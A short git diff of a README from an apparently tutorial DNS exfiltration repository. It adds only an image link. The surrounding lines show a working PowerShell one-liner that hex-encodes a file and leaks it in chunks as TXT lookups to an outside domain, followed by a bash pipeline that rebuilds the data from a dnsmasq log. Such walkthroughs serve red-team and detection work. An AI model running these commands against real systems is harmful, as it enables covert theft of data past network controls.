@@ -82,6 +82,9 @@ sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"
 
 certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5}  
 
+![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/17905ffc-ee42-4f8d-b801-7f837d3da555)
+
+
 ## Step 12: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
 
 sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output
